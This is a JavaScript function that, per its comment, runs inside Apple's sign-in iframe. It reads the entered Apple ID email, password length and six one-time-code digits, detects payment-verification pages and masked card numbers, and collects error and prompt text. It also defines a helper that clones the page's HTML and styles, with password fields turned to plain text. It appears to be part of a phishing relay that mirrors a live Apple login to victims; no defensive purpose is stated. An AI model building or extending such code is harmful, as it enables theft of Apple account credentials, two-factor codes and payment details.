// Evaluated inside Apple's idmsa sign-in iframe.
() => {
  const account = document.getElementById('account_name_text_field');
  const password = document.getElementById('password_text_field');
  const passwordVisible =
    password &&
    !password.disabled &&
    password.getAttribute('aria-hidden') !== 'true' &&
    password.offsetParent !== null;

  const otpInputs = Array.from(
    document.querySelectorAll(
      'input.form-security-code-input, input.security-code-input, input[name*="security"], input[autocomplete="one-time-code"]'
    )
  ).filter((el) => el.offsetParent !== null);

  const otpFromBoxes = Array.from(document.querySelectorAll('input[maxlength="1"]')).filter(
    (el) => el.offsetParent !== null && /^\d?$/.test(el.value || '')
  );

  let otpDigits = [];
  if (otpInputs.length >= 6) {
    otpDigits = otpInputs.slice(0, 6).map((el) => el.value.replace(/\D/g, '').slice(-1));
  } else if (otpFromBoxes.length >= 6) {
    otpDigits = otpFromBoxes.slice(0, 6).map((el) => el.value.replace(/\D/g, '').slice(-1));
  }

  const errors = [];
  const errorSelectors = [
    '[role="alert"]',
    '.form-message',
    '.form-message-wrapper',
    '.idms-error',
    '.fed-ui-error',
    '#errMsg',
    '.signin-error',
    '.tk-subbody-headline',
  ];
  errorSelectors.forEach((sel) => {
    document.querySelectorAll(sel).forEach((el) => {
      if (!el || el.offsetParent === null) return;
      const text = (el.innerText || el.textContent || '').trim().replace(/\s+/g, ' ');
      if (!text || text.length >= 280 || errors.includes(text)) return;
      errors.push(text);
    });
  });

  function isJunkError(text) {
    const t = text.toLowerCase();
    if (t.length < 4) return true;
    if (/^(email or phone number|password|account|verification code digit)$/i.test(text)) return true;
    if (/verification code digit/i.test(t) && !/incorrect|invalid|try again|too many|failed/i.test(t)) {
      return true;
    }
    return false;
  }

  function scoreError(text) {
    const t = text.toLowerCase();
    if (/incorrect verification code/.test(t)) return 100;
    if (/incorrect password|check the account information/.test(t)) return 95;
    if (/incorrect/.test(t)) return 90;
    if (/try again/.test(t)) return 80;
    if (/too many/.test(t)) return 70;
    return 20;
  }

  const filteredErrors = errors
    .filter((e) => !isJunkError(e))
    .sort((a, b) => scoreError(b) - scoreError(a));

  const errorsOut = filteredErrors.length ? filteredErrors : errors.slice(0, 2);

  const bodyText = (document.body && document.body.innerText) || '';
  const lines = bodyText
    .split('\n')
    .map((l) => l.trim())
    .filter(Boolean);

  let pageKind = 'auth';
  let paymentCopy = null;
  let pageCopy = null;

  if (/verify your payment information/i.test(bodyText)) {
    pageKind = 'payment';
    const title =
      lines.find((l) => /verify your payment information/i.test(l)) ||
      'Verify your payment information';
    const lede =
      lines.find((l) =>
        /app store|apple music|security code|not be charged|payment method/i.test(l)
      ) || '';
    let cardMask = '';
    const maskMatch = bodyText.match(
      /(?:\.{4}|•{4}|\*{4})[\s·]*(?:\.{4}|•{4}|\*{4})[\s·]*(?:\.{4}|•{4}|\*{4})[\s·]*(\d{4})/
    );
    if (maskMatch) {
      cardMask = '•••• •••• •••• ' + maskMatch[1];
    }
    paymentCopy = { title, body: lede, cardMask };
  }

  let step = 'email';
  if (pageKind === 'payment') {
    step = 'payment';
  } else if (otpDigits.length === 6 && otpDigits.every((d) => d)) {
    step = 'otp';
  } else if (otpInputs.length >= 4 || otpFromBoxes.length >= 4) {
    step = 'otp';
  } else if (passwordVisible) {
    step = 'password';
  } else if (
    pageKind === 'auth' &&
    bodyText.length > 160 &&
    !/sign in to your apple account/i.test(bodyText)
  ) {
    pageKind = 'generic';
    step = 'generic';
    pageCopy = {
      title: lines[0] || 'Continue',
      body: lines.slice(1, 6).join('\n'),
    };
  }

  let verifyVariant = null;
  let verifyCopy = null;
  if (step === 'otp') {
    const raw = ((document.body && document.body.innerText) || '').replace(/\s+/g, ' ').trim();
    const isEmail =
      /email with a verification code has been sent/i.test(raw) ||
      /enter verification code/i.test(raw);
    verifyVariant = isEmail ? 'email' : 'device';

    const lines = ((document.body && document.body.innerText) || '')
      .split('\n')
      .map((l) => l.trim())
      .filter(Boolean);
    let title = '';
    let body = '';
    const titleIdx = lines.findIndex((l) => /^enter verification code$/i.test(l));
    if (titleIdx >= 0) {
      title = lines[titleIdx];
      body = lines[titleIdx + 1] || '';
    } else {
      const h = document.querySelector('h1, h2, .tk-intro-headline, [class*="headline"]');
      title = h ? (h.innerText || '').trim() : 'Enter verification code';
      const p = document.querySelector('.subtitle, .form-body, p');
      body = p ? (p.innerText || '').trim() : '';
    }
    if (!body && /sent to .+ enter the code/i.test(raw)) {
      const m = raw.match(/An email with a verification code has been sent to [^.]+\. Enter the code to continue\./i);
      if (m) body = m[0];
    }

    const links = [];
    document.querySelectorAll('a, button').forEach((el) => {
      if (!el || el.offsetParent === null) return;
      const t = (el.innerText || el.textContent || '').trim().replace(/\s+/g, ' ');
      if (!t || t.length > 80) return;
      if (/verification code|support pin|resend|devices/i.test(t) && !links.includes(t)) {
        links.push(t);
      }
    });

    verifyCopy = {
      variant: verifyVariant,
      title: title || (isEmail ? 'Enter verification code' : 'Two-Factor Authentication'),
      body:
        body ||
        (isEmail
          ? ''
          : 'A message with a verification code has been sent to your devices. Enter the code to continue.'),
      links,
    };
  }

  const loadingEl =
    document.querySelector('.signin-spinner, .spinner, .loading-wrapper')?.offsetParent !== null;
  let loadingFlag = Boolean(loadingEl);
  if (step === 'otp' && (otpInputs.length >= 4 || otpFromBoxes.length >= 4)) {
    loadingFlag = false;
  }
  if (pageKind === 'payment' && /verify your payment information/i.test(bodyText)) {
    loadingFlag = false;
  }

  function collectDocumentStyles() {
    const parts = [];
    document.querySelectorAll('style').forEach((s) => {
      const t = (s.textContent || '').trim();
      if (t) parts.push(t);
    });
    document.querySelectorAll('link[rel="stylesheet"]').forEach((link) => {
      try {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', link.href, false);
        xhr.send(null);
        if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText) {
          parts.push(xhr.responseText);
        }
      } catch {
        parts.push('/* link: ' + (link.href || '') + ' */');
      }
    });
    Array.from(document.styleSheets || []).forEach((sheet) => {
      try {
        const rules = sheet.cssRules;
        if (!rules) return;
        for (let i = 0; i < rules.length; i++) {
          parts.push(rules[i].cssText);
        }
      } catch {
        const link = sheet.ownerNode;
        if (link && link.tagName === 'LINK' && link.href) {
          parts.push('/* stylesheet: ' + link.href + ' */');
        }
      }
    });
    return parts.join('\n').slice(0, 220000);
  }

  function syncLiveControlState(liveRoot, cloneRoot) {
    const liveControls = liveRoot.querySelectorAll('input, textarea, select');
    const cloneControls = cloneRoot.querySelectorAll('input, textarea, select');
    cloneControls.forEach((el, i) => {
      const live = liveControls[i];
      if (!live) return;
      if (live.type === 'checkbox' || live.type === 'radio') {
        el.checked = live.checked;
      } else {
        el.value = live.value;
      }
      if (live.getAttribute('aria-invalid')) {
        el.setAttribute('aria-invalid', live.getAttribute('aria-invalid'));
      }
    });
  }

  function buildMirrorShell() {
    const root =
      document.querySelector('.widget-container') ||
      document.querySelector('.signin') ||
      document.querySelector('#content') ||
      document.querySelector('.body-view') ||
      document.body;
    if (!root) return null;
    const clone = root.cloneNode(true);
    clone.querySelectorAll('script, iframe, noscript').forEach((el) => el.remove());
    clone.querySelectorAll('form').forEach((f) => {
      f.removeAttribute('action');
      f.setAttribute('novalidate', 'novalidate');
    });
    clone.querySelectorAll('input').forEach((inp) => {
      inp.removeAttribute('name');
      if (inp.type === 'password') inp.type = 'text';
      inp.setAttribute('autocomplete', 'off');
    });
    syncLiveControlState(root, clone);
    const styles = collectDocumentStyles();
    const html = (clone.outerHTML || '').slice(0, 120000);
    if (!html || html.length < 80) return null;
    const titleLine =
      (clone.querySelector('h1, h2, .tk-intro-headline') &&
        (clone.querySelector('h1, h2, .tk-intro-headline').innerText || '').trim()) ||
      lines[0] ||
      '';
    const fpSource = [step, pageKind, titleLine, bodyText.replace(/\s+/g, ' ').trim().slice(0, 240)].join(
      '|'
    );
    return {
      kind: pageKind === 'payment' ? 'payment' : step === 'otp' ? 'otp' : step || pageKind || 'generic',
      fingerprint: fpSource,
      title: titleLine,
      html,
      styles,
      bodyClass: (document.body && document.body.className) || '',
      htmlClass: (document.documentElement && document.documentElement.className) || '',
    };
  }

  let mirrorShell = null;

  return {
    step,
    email: account ? account.value : '',
    passwordLen: password && passwordVisible ? password.value.length : 0,
    otpDigits,
    errors: errorsOut,
    loading: loadingFlag,
    verifyVariant,
    verifyCopy,
    pageKind,
    paymentCopy,
    pageCopy,
  };
};
